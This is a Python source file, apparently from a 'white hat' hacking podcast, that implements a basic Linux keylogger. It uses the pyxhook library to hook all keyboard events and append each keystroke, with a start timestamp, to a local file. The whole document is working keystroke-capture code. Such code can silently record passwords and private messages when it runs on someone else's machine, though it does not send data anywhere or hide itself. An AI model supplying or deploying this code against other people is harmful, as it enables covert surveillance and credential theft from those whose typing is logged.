"""
author: WhiteHatHackingPodcast
date: July 8th, 2020
version: 1.0.0
availibility: GitHub
description: A Basic Keylogger in Python for Linux
"""

# Imports For Keylogger
import os
import pyxhook
import datetime

class Keylogger:
    """
    A key logger that extends the pyhook.HookManager object to store key strokes.
    """

    def __init__(self):
        """Create a new object."""
        self.output_file = ""

    def setOutputFile(self,fileName):
        """
        A setter function for taking output. Takes fileName and location and sets it as a save file.
        """

        self.output_file = fileName
        return 0
    
    def dateToOutFile(self):
        """
        This function writes the date at which the key logger begins writing key strokes to a tracking file.
        """

        today = datetime.datetime.now().isoformat()
        with open(self.output_file, 'a') as f:
            f.write("\n" + today + "\n")
        f.close()
        return 0

    def OnKeyPress(self, event):
        """
        This function creates a keypressing event and saves it to the output file.
        """

        with open(self.output_file, 'a') as f: 
            f.write('{}\n'.format(event.Key)) 

if __name__ == "__main__":
    """
    Sets the log file, starts the key logger and writes all keyboard events to file.
    """
    # Instantiate Keylogger Object and Hook
    logger = Keylogger()
    new_hook = pyxhook.HookManager()
    new_hook.KeyDown = logger.OnKeyPress
    new_hook.HookKeyboard() 

    # Set the output file and writes the current date
    output_file = 'output_file'
    logger.setOutputFile(output_file)
    logger.dateToOutFile()

    try: 
        new_hook.start() # Starts the logger 
    except KeyboardInterrupt: 
        #  User cancelled from command line. 
        pass
    